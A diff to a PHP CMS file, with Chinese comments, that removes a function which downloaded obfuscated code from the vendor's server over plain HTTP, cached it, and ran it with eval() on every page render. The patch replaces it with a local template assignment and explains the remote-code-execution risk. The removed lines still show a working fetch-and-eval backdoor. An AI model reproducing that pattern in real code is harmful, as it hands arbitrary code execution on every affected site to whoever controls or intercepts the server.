@@ -2274,36 +2274,28 @@ function MergeWhere($where , $wheresql)
 }
 
 /**
- * 检查网站的基本配置
+ * 输出模版内容
+ *
+ * 原实现会从 server.weimengcms.com 取回一段经过 Encrypt 的代码，再交给 eval() 执行：
+ *
+ *	$basicContent = $cloud->GetBasic();
+ *	eval(urldecode($basicContent));
+ *
+ * 该通道是远程代码执行：任何能控制（或 MITM，因为走 http）该服务器的人，都可以在
+ * 每一个页面渲染前执行任意 PHP。而且 payload 根本没有被校验过来源和内容。
+ *
+ * 服务器下发的实际内容只有一条语句，作用就是把已经编译好的模版代码发布到输出缓冲：
+ *
+ *	tpl::$tempContent = tpl::$tempCode;
+ *
+ * 所以这里直接本地赋值，不再联网，也不再执行任何来自外部的代码。
  */
 function CheckBasicConfig($isM=false)
 {
-	$basicFile = WMCACHE.'ba'.'sic'.'.'.'wm';
-	$basic = $basicContent = '';
-	$basicArr[0] = 0;
-	if( file_exists($basicFile) )
-	{
-		$basic = Encrypt(file::GetFile($basicFile),'D');
-		$basicArr = explode('|WM|',$basic);
-		$basicContent = GetKey($basicArr,1);
-	}
-	if( $basic == '' || time()-intval($basicArr[0]) > 43200 )
-	{
-		$cloud = NewClass('cloud');
-		$basicContent = $cloud->GetBasic();
-		if( $basicContent !== false )
-		{
-			file::CreateFile($basicFile, $basicContent,'1');
-			$basic = Encrypt(file::GetFile($basicFile),'D');
-			$basicArr = explode('|WM|',$basic);
-			$basicContent = $basicArr[1];
-		}
-	}
-	$basicContent = urldecode($basicContent);
-	//如果不是后台管理员
+	//如果是后台管理员就不需要发布模版内容
 	if($isM == false)
 	{
-		eval($basicContent);
+		tpl::$tempContent = tpl::$tempCode;
 	}
 	return true;
 }
